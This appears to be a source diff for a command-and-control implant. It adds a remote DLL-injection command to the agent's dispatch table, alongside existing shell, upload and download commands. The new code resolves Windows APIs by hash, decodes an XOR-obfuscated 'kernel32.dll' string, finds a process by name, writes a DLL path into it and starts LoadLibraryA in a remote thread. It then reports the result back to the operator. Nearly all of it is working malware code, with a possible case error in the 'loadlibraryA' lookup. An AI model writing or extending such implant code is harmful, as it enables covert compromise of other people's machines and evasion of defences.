@@ -9,7 +9,7 @@ extern UINT32   g_AgentID;
 extern DWORD    g_SleepTime;
 extern BOOL     g_Connected;
 
-#define COMMAND_COUNT 5
+#define COMMAND_COUNT 6
 
 VOID TaskParserNew(PTASK_PARSER Parser, PVOID Buffer, UINT32 Size, UINT32 Endian){
     Parser->Buffer = (PUCHAR)Buffer;
@@ -322,12 +322,156 @@ VOID CommandExit(PTASK_PARSER Parser){
     if (pExit) pExit(0);
 }
 
+
+VOID CommandInjectDLL(PTASK_PARSER Parser){
+    typedef HANDLE (WINAPI* fn_OpenProcess)(DWORD, BOOL, DWORD);
+    typedef LPVOID (WINAPI* fn_VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
+    typedef BOOL   (WINAPI* fn_WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
+    typedef HANDLE (WINAPI* fn_CreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
+    typedef BOOL   (WINAPI* fn_Close)(HANDLE);
+    typedef DWORD  (WINAPI* fn_Wait)(HANDLE, DWORD);
+    typedef FARPROC (WINAPI* fn_GetProcAddress)(HMODULE, LPCSTR);
+    typedef HMODULE (WINAPI* fn_GetModuleHandleA)(LPCSTR);
+
+    typedef HANDLE (WINAPI* fn_Snapshot)(DWORD, DWORD);
+    typedef BOOL   (WINAPI* fn_ProcFirst)(HANDLE, LPPROCESSENTRY32);
+    typedef BOOL   (WINAPI* fn_ProcNext)(HANDLE, LPPROCESSENTRY32);
+
+    HMODULE k32 = ResolveModuleH(H_KERNEL32);
+    if (!k32) return;
+
+    fn_OpenProcess        pOpen      = (fn_OpenProcess)ResolveFuncH(k32, H_OpenProcess);
+    fn_VirtualAllocEx     pVAlloc    = (fn_VirtualAllocEx)ResolveFuncH(k32, H_VirtualAllocEx);
+    fn_WriteProcessMemory pWriteMem  = (fn_WriteProcessMemory)ResolveFuncH(k32, H_WriteProcessMemory);
+    fn_CreateRemoteThread pRemote    = (fn_CreateRemoteThread)ResolveFuncH(k32, H_CreateRemoteThread);
+    fn_Close              pClose     = (fn_Close)ResolveFuncH(k32, H_CloseHandle);
+    fn_Wait               pWait      = (fn_Wait)ResolveFuncH(k32, H_WaitForSingleObject);
+    fn_GetProcAddress     pGPA       = (fn_GetProcAddress)ResolveFuncH(k32, H_GetProcAddress);
+    fn_GetModuleHandleA   pGMH       = (fn_GetModuleHandleA)ResolveFuncH(k32, H_GetModuleHandleA);
+
+    fn_Snapshot           pSnap      = (fn_Snapshot)ResolveFuncH(k32, H_CreateToolhelp32Snapshot);
+    fn_ProcFirst          pFirst     = (fn_ProcFirst)ResolveFuncH(k32, H_Process32First);
+    fn_ProcNext           pNext      = (fn_ProcNext)ResolveFuncH(k32, H_Process32Next);
+
+    if (!pOpen || !pVAlloc || !pWriteMem || !pRemote || !pClose || !pWait || !pGPA || !pGMH)
+        return;
+
+    UINT32 nameLen = 0;
+    UINT32 dllLen  = 0;
+    PCHAR  procName = TaskParserGetBytes(Parser, &nameLen);
+    PCHAR  dllPath  = TaskParserGetBytes(Parser, &dllLen);
+
+    if (!dllPath || dllLen == 0) return;
+
+    CHAR dllBuf[MAX_PATH] = { 0 };
+    if (dllLen >= sizeof(dllBuf)) dllLen = sizeof(dllBuf) - 1;
+    memcpy(dllBuf, dllPath, dllLen);
+
+    DWORD dwPid = 0;
+
+    if (procName && nameLen > 0) {
+        CHAR nameBuf[MAX_PATH] = { 0 };
+        if (nameLen >= sizeof(nameBuf)) nameLen = sizeof(nameBuf) - 1;
+        memcpy(nameBuf, procName, nameLen);
+
+        if (pSnap && pFirst && pNext) {
+            HANDLE hSnap = pSnap(TH32CS_SNAPPROCESS, 0);
+            if (hSnap != INVALID_HANDLE_VALUE) {
+                PROCESSENTRY32 pe;
+                pe.dwSize = sizeof(pe);
+
+                if (pFirst(hSnap, &pe)) {
+                    do {
+                        BOOL match = TRUE;
+                        for (int k = 0; nameBuf[k]; k++) {
+                            CHAR a = nameBuf[k];
+                            CHAR b = pe.szExeFile[k];
+                            if (a >= 'A' && a <= 'Z') a += 32;
+                            if (b >= 'A' && b <= 'Z') b += 32;
+                            if (a != b) { match = FALSE; break; }
+                        }
+                        if (match) {
+                            dwPid = pe.th32ProcessID;
+                            break;
+                        }
+                    } while (pNext(hSnap, &pe));
+                }
+                pClose(hSnap);
+            }
+        }
+    }
+
+    if (dwPid == 0) {
+        PPACKAGE pkg = PackageCreate(COMMAND_OUTPUT);
+        char err[] = "inject: target not found";
+        PackageAddBytes(pkg, (PUCHAR)err, sizeof(err) - 1);
+        PackageTransmit(pkg, NULL, NULL);
+        return;
+    }
+
+    HANDLE hProc = pOpen(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, dwPid);
+    if (!hProc || hProc == INVALID_HANDLE_VALUE) {
+        PPACKAGE pkg = PackageCreate(COMMAND_OUTPUT);
+        char err[] = "inject: openprocess failed";
+        PackageAddBytes(pkg, (PUCHAR)err, sizeof(err) - 1);
+        PackageTransmit(pkg, NULL, NULL);
+        return;
+    }
+
+    SIZE_T pathSize = strlen(dllBuf) + 1;
+    LPVOID pRemoteBuf = pVAlloc(hProc, NULL, pathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!pRemoteBuf) {
+        pClose(hProc);
+        PPACKAGE pkg = PackageCreate(COMMAND_OUTPUT);
+        char err[] = "inject: virtualallocex failed";
+        PackageAddBytes(pkg, (PUCHAR)err, sizeof(err) - 1);
+        PackageTransmit(pkg, NULL, NULL);
+        return;
+    }
+
+    if (!pWriteMem(hProc, pRemoteBuf, dllBuf, pathSize, NULL)) {
+        pClose(hProc);
+        PPACKAGE pkg = PackageCreate(COMMAND_OUTPUT);
+        char err[] = "inject: writeprocessmemory failed";
+        PackageAddBytes(pkg, (PUCHAR)err, sizeof(err) - 1);
+        PackageTransmit(pkg, NULL, NULL);
+        return;
+    }
+
+    UCHAR sK32[] = { 0xE4,0xEA,0xFD,0xE1,0xEA,0xE3,0xBC,0xBD,0xA1,0xEB,0xE3,0xE3,0x00 };
+    for (int i = 0; i < 12; i++) sK32[i] ^= 0x8F;
+
+    HMODULE hK32Remote = pGMH((LPCSTR)sK32);
+    FARPROC pLoadLib = pGPA(hK32Remote, "loadlibraryA");
+
+    HANDLE hThread = pRemote(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLib, pRemoteBuf, 0, NULL);
+    if (!hThread) {
+        pClose(hProc);
+        PPACKAGE pkg = PackageCreate(COMMAND_OUTPUT);
+        char err[] = "inject: createremotethread failed";
+        PackageAddBytes(pkg, (PUCHAR)err, sizeof(err) - 1);
+        PackageTransmit(pkg, NULL, NULL);
+        return;
+    }
+
+    pWait(hThread, 5000);
+    pClose(hThread);
+    pClose(hProc);
+
+    PPACKAGE pkg = PackageCreate(COMMAND_OUTPUT);
+    char msg[512];
+    int n = wsprintfA(msg, "injected %s into pid %lu", dllBuf, dwPid);
+    PackageAddBytes(pkg, (PUCHAR)msg, n);
+    PackageTransmit(pkg, NULL, NULL);
+}
+
 static COMMAND_ENTRY CommandTable[COMMAND_COUNT] = {
     { .ID = COMMAND_SHELL,    .Function = CommandShell },
     { .ID = COMMAND_UPLOAD,   .Function = CommandUpload },
     { .ID = COMMAND_DOWNLOAD, .Function = CommandDownload },
     { .ID = COMMAND_EXIT,     .Function = CommandExit },
-    { .ID = COMMAND_PROCLIST, .Function = CommandProcList },
+    { .ID = COMMAND_PROCLIST,   .Function = CommandProcList },
+    { .ID = COMMAND_INJECT_DLL, .Function = CommandInjectDLL },
 };
 
 VOID CommandDispatcher(VOID){
